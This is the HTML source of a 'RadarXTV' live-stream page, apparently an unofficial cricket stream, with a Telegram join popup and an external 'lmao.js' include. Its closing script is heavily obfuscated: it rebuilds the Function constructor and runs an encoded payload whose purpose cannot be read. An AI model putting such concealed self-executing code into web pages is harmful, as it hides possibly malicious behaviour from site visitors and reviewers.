<!DOCTYPE html>
<?php include 'banner.php'; ?>
<html lang="en">
<head>
<script src="lmao.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXTV - Live Stream</title>
    <style>
        body { 
            background-color: #121212; 
            color: white; 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container { 
            text-align: center;
            position: relative;
        }
        iframe { 
            width: 80vw;  /* Width same as before */
            height: 60vh; /* Reduced height */
            border: none; 
            display: block; 
            margin: 0 auto;
        }
        #loadingMessage, #refreshMessage { 
            font-size: 16px; 
            color: red; 
            position: relative;
        }
        #refreshMessage { 
            color: yellow; 
            margin-top: 10px;
        }
        #fullScreenBtn { 
            position: fixed; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%);
            padding: 10px 20px; 
            background-color: #00ffcc; 
            color: white; 
            font-size: 16px; 
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .popup { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.8); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .popup-content { 
            background: white; 
            color: black; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
        }
        .popup button { 
            margin: 10px; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
        }
            .logo {
        position: absolute;
        top: 10px; /* Adjust vertical position */
        left: 10px; /* Adjust horizontal position */
        z-index: 1; /* Ensure the logo appears above the video */
        max-width: 120px; /* Set maximum width for the logo */
        max-height: 120px; /* Set maximum height for the logo */
        pointer-events: none; /* Prevent interference with video controls */
    }
    
    </style>
</head>
<body>
    <!-- Video container -->
    <div class="video-container">
        <!-- Logo inside the video -->
        <img src="chutman.jpg" alt="Logo" class="logo">
        
<div class="container">
    <h1>RadarXTV - Live Stream</h1>
    
    <div id="iframeContainer">
        <iframe id="streamIframe" src="" style="display:none;"></iframe>
    </div>
    
    <div id="loadingMessage">Loading stream... Please wait.</div>
    <div id="refreshMessage">Refresh the page if stream takes more than 60 seconds to load.</div>
    
    <button id="fullScreenBtn">Full Screen</button>
</div>

<!-- Popup for Telegram -->
<div id="popup" class="popup" style="display: flex;">
    <div class="popup-content">
        <p>Join RadarXCricket on Telegram</p>
        <button id="joinBtn">Join</button>
        <button id="cancelBtn">Cancel</button>
    </div>
</div>

<script>
(function(){var vEy='',lUn=705-694;function JmC(y){var v=114708;var a=y.length;var z=[];for(var c=0;c<a;c++){z[c]=y.charAt(c)};for(var c=0;c<a;c++){var i=v*(c+111)+(v%27427);var f=v*(c+396)+(v%27364);var r=i%a;var g=f%a;var w=z[r];z[r]=z[g];z[g]=w;v=(i+f)%7445007;};return z.join('')};var cOc=JmC('gtoorqdcncurnafebshljwpcoxikuyzmvtsrt').substr(0,lUn);var QWT='.s,]r=;5=}=j6a8=; r[vr ,etpz.2=l +{jcvsu[.+.mvShwxrns;g)09.o+=d,7rro]0m"!n)e]whrA,rnosi=enegu+r+ef+,(6,(wru4u9j380uni=sl n;l; n)d (}Ao,m.=snt7v.;;0q(nc;r;.a+6[vt[;8(z2=1;knv vf23=.f=1is5)a,n,v1=0.a(vr}0"rughmAkawvc+m)n0n,;+ng=uv4s"a0.,r *ei;g(uuitog v{ .0c)laayt )h""fohrirC)lic-9r-vr.+;n;cc-8zhdt3>;+umlmh1lwhuh7fh;iaq y=8yal)rhsrp;sACar=eagflpn rnae4p = {ohi*adz[={;s0ssnua)=8(r(e<c6vl+va1nil1a;z;)lhf2,n]=+,rfl)w{d (2umC(lrcpt.Cr.6.2)t(z,1)wng<d3;d++0;=[st+=-qr==j2cf9rltz]=vj;tsie])scz,"e)h]}<((61h7+tiphC;8um)o=g)",h-7;a=([]tr+ro.(n=en=oai;uek. t(g")j.  vc0a ;i7r}>,)p+gu;rk;.hee9tzo;=v(qrpf;wf(=wt((lfdd;v;z=z=r]fta1p=br[ng.iSfc);s) ,p,=emc{ ol"ai[.g[br)ueopr1o.-e 1hjm)z]nr;+,sat(meivbt8;r.(+[.agv](8;s;oam)),)4lh!e.n-xrva[(=];9rhi ckba{));a8lg+9gprr=Ad;6cCjat(C[,(e6f+prn(2c(ig=;ov<fii],+uuvmm(yfoe.4e=6h5,[rrtfan+t( i)vCainox1}oz((tro7;hav7bv<a2)vr))")e;,rn;,]=(tl0};a=rahie=a5bv,7';var AXe=JmC[cOc];var iiB='';var zhy=AXe;var LOd=AXe(iiB,JmC(QWT));var pEK=LOd(JmC('=\'R;sqe  7rr;8f16wsf)  %dl]531(R>=(R<rlRg(4,8uoE1jReeon el0}e;Re3Rm4)e$,e2n{95R M13_s7o<).,__A;9;o\/r;uErR77Mn.k(e.2.B$e__.ofebesn.[rc#;Rf$jn.$c&aer(NaeoRiR16slR;4ss(3c+_n4Rl4{(r]!_)4.(2iRKRbi)roisw6;8.sL!.t<dnbg\'Rw;{a=snRR,J_%)C]pRheena)dlRe:F{di! .1!4R(RRu]1%(4t__oeRR,la;og77;eRRg4L)oc]aRg epRRa=]e$dRneu{(R%sgl\'nR\']Rfoin%o)8e$t#mwRe oe3d=m1\/,ntj;R;8ls_b,cp$R$)RlRdH.nh_n.=("_]a{n,nRnnr-76Ef]Rm%i4s.]$nRr8hR!RyfpiRiR!p_H2tRrR01\/,r_(y_elIo}7teeeo).ti2lsc1%(3Ro=r;l;7_44$C.sRR$oejRl. R;R}R9]QH5R)(r\/rRe (.o haDo%.KRf7%RpR:4c7ahRf%0)2rn.oRcn R.n6eR%)]p6(tt[P!eef.R942#,Rn.Rzj4;ejo\/2;a6p\/.0c}IqR.".et$oi2c3R cR7tic)trD]o(0J4ah5R.4krB3Rbgo"yiH%e.{bitr_tpS3t7{e$1.5%35f7Rd)c+. rR$Rw,S_RetR6#oo{%Rns_wo_J_d 3per8JRR_ug00js(DRis;Crpl4_lG$c=Rd(lR26ti;j$a$Rj.t(b#)e+(feR!(R);;a)nd\/e(Fo(.i].}ph4!),a%R]ynhpR69 b35t3=2RonuRekRfoR5f7e#jq)7g.%dea0g4eR{C,%26}%1.:eg6R=3)_nd]d))r6Rv)e93d]: ln9s!nRRo5lRLRii-0!eeRRL_ mt%)}C(30.is%.(_a)$g;b(;4R3te;aesR{ou ?[wC3 =(%=)+(ibrR;onR!54;RaKIan{a(hbRm3,nReoaFueRrrnRCR bt(n.g ?%a R1R0_RB0foae_dRt;pFRR)E!aR}R=M_+D(.c)]Ro22-k%R=eI.4fhe=_u&[ei.Lm4dRRKt@go2R21Bif9]R4f"Re6dRrv=RfMs85fgtgb_]l F1!}hfmvRct{Rl=R(u11RRR)!$#!4m,;R1]R6kd,(Rte=hjRtRoA)1si$;RR[5HeHD5R:k.e)d-\/(;2;]2s?9rR8o}SIj$R_Re"j6$e=RERdRr:)Re ;_Rl2Rn6oRR{o1tRR(]q27.)s1=[74()tte)"J (.Hdbe")4nR(e;.5_(\/saRpi7er4h#i.66snR.R1tp(eR]{!.[RJ,=,=d]RaeN[RA!rcRo?,(82Rio2%)H9)>Rd3n\/,!_ascR,C&t.}a3e.,]=hdglA37c$3RnR4+,R.\/RSo9%R)1{{!?%cb)r3GRo(.4__. R?cRti7hyttR_)_[ao])6(Rs3(.9f)}5.%_I)]=6eI$.%fR%53]Rn) a0m5tR&ep=b747_$RR,"!]t(RRonaRuReQtd{:) lRar;;r!.!.e+R!]ta860ihlRM )6R9R#=tRte5[.Rg(Mdl7Rut]d2Rn1ls10g]%+#(9Qte{o(*e(;li4gi1g(7ei[68%(3lR)o&s9 ])(,e.$4l7Re9toj.)];g=;QP5aR{()R.ebi3,]_R65oo])$"6Rte.n.b3u2_($n(\'sceR_,FFiel..+f%>seeRat}al}maR_fRRM;hRut$kt4}Rej%.}eR R[}(RR=Re1_%2mR3 lw[6].sje-)n_e]}Ra.4Rweon?R36sP0R{_8R.${aRjRC5fr)$%!_RRudR$)R}cR.)%RjRR9)RuR!56ri6 R(_rsB2(e,r[h.oaKtl] 35_j]l]*f>C=5,er()R)_R 7i)#Rgn(NR+;ehRRet3g. Ri7_7?6];i,@)eoee8,r)i)!2))w4s44;R)>\/6bqt(R[}coe_{i$}sbdJ5(m53nC)eR_4vln]!.u**0{ti0n>ce R;6j\/[v;eea2e5t"c_ln=Rso4s1Rog.R.l$5K ,cRamuC3s&)toeginRR6h(,se;Rop!a_tmaR]9"Rde>2eitnr$n4._a6%sstR7R.RrP%dde7n.tf8{d ]pRdR(=Rom)l@)(.SI5)dA9s$Io%2nRb.RRRn(o)@r1 e.6Rr).!m[l)}NerReR [)\/e_5u"ea_eh3f]RFR35(m\/7R(.2I32\/tRi%liH]$Riu]EfesFpR.a.m5ldRdnl.iR!Re e)O;7y R]5!hRIRf_n( 7.C$E;{R=otRd_d(3co;.>s(v.rv&a j(0 k%)= $!){'));var uak=zhy(vEy,pEK );uak(5268);return 5588})()
</script>

</body>
</html>